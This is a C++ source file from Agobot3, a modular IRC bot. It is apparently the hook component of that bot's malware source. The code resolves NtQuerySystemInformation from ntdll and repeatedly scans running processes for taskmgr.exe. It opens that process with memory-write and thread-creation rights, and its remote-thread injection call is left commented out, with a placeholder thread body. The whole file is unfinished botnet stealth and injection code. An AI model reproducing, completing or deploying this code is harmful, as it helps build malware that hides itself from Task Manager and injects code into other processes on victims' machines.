/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "cthread.h"
#include "hook.h"
#include "mainctrl.h"

#ifdef WIN32

//CHook g_cHook;

NtQuerySystemInfoFunc g_pfnNtQuerySystemInformation=NULL;

NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, \
									void *pSystemInformation, \
									unsigned long lSystemInformationLength, \
									unsigned long *lReturnLength) {
	return g_pfnNtQuerySystemInformation(	SystemInformationClass, pSystemInformation, \
											lSystemInformationLength, lReturnLength);
}

CHook::CHook() {
	m_szType="CHook";
	m_hDLL=GetModuleHandle("ntdll.dll");
	if(!m_hDLL) m_hDLL=LoadLibrary("ntdll.dll");
	g_pfnNtQuerySystemInformation=(NtQuerySystemInfoFunc)GetProcAddress(m_hDLL, \
		"NtQuerySystemInformation");
//	g_pMainCtrl->CanStart(this);
}

CHook::~CHook() {
	FreeLibrary(m_hDLL);
}

DWORD WINAPI HookThread(LPVOID param) {
	while(true)
		MessageBox(NULL, "bla", "Debug", MB_OK);
	return 0;
}
 
void CHook::Hook(HANDLE hProcess) {
	if(!hProcess) return;

	DWORD dwThreadId;
//	HANDLE hThread=CreateRemoteThread(hProcess, NULL, NULL, HookThread, NULL, NULL, &dwThreadId);
}

void *CHook::Run() {
	char *szProcName="taskmgr.exe";
	
	HANDLE hProcess; DWORD aProcesses[1024], cbNeeded, cProcesses;
	while(true) {
		unsigned int i; char szProcessName[MAX_PATH]; HMODULE hMod;
		if(!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) return false;
		cProcesses=cbNeeded/sizeof(DWORD);
		for(i=0; i<cProcesses; i++) {
			strcpy(szProcessName, "unknown");
			hProcess=OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, aProcesses[i]);
			if(hProcess) {
				if(EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
					GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
					if(!stricmp(szProcessName, szProcName)) {
						Hook(hProcess); Sleep(60000); }
				}
				CloseHandle(hProcess);
			}
		}
		Sleep(250);
	}
	return NULL;
}

#endif // WIN32
